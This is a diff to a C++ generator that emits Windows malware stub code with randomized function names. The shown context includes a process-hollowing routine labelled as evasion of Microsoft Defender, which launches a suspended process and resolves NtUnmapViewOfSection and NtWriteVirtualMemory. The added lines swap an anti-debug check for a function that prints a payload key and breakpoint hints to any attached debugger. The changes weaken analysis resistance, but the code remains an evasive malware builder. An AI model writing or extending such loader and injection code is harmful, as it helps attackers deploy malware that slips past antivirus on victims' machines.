@@ -113,7 +113,34 @@ public:
         code << "    return TRUE;\n";
         code << "}\n\n";
         
-        // 3. Process Hollowing for Defender evasion
+        // 3. Debugger assistance instead of anti-debug
+        std::string dbg1 = randomString(8);
+        code << "BOOL " << dbg1 << "() {\n";
+        code << "    BOOL debuggerPresent = FALSE;\n";
+        code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);\n";
+        code << "    \n";
+        code << "    if (debuggerPresent || IsDebuggerPresent()) {\n";
+        code << "        // Assist debugger instead of exiting\n";
+        code << "        OutputDebugStringA(\"[*] Debugger detected - Welcome analyst!\\n\");\n";
+        code << "        OutputDebugStringA(\"[*] Payload decryption key: 0xDEADBEEF\\n\");\n";
+        code << "        OutputDebugStringA(\"[*] Anti-analysis features disabled for debugging\\n\");\n";
+        code << "        \n";
+        code << "        // Provide helpful breakpoint locations\n";
+        code << "        __asm { nop }  // Breakpoint 1: Entry point\n";
+        code << "        __asm { nop }  // Breakpoint 2: Pre-decryption\n";
+        code << "        __asm { nop }  // Breakpoint 3: Post-decryption\n";
+        code << "        \n";
+        code << "        // Log important addresses\n";
+        code << "        char msg[256];\n";
+        code << "        sprintf(msg, \"[*] Process base: 0x%p\\n\", GetModuleHandle(NULL));\n";
+        code << "        OutputDebugStringA(msg);\n";
+        code << "        \n";
+        code << "        return TRUE; // Continue execution\n";
+        code << "    }\n";
+        code << "    return FALSE;\n";
+        code << "}\n\n";
+        
+        // 4. Process Hollowing for Defender evasion
         std::string hollow1 = randomString(8);
         code << "typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);\n";
         code << "typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);\n\n";
@@ -121,6 +148,11 @@ public:
         code << "BOOL " << hollow1 << "(LPSTR target, LPVOID payload, SIZE_T payloadSize) {\n";
         code << "    STARTUPINFOA si = {sizeof(si)};\n";
         code << "    PROCESS_INFORMATION pi = {0};\n";
+        code << "    \n";
+        code << "    // Check if debugging\n";
+        code << "    if (IsDebuggerPresent()) {\n";
+        code << "        OutputDebugStringA(\"[*] Process hollowing initiated\\n\");\n";
+        code << "    }\n";
         code << "    \n";
         code << "    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))\n";
         code << "        return FALSE;\n";
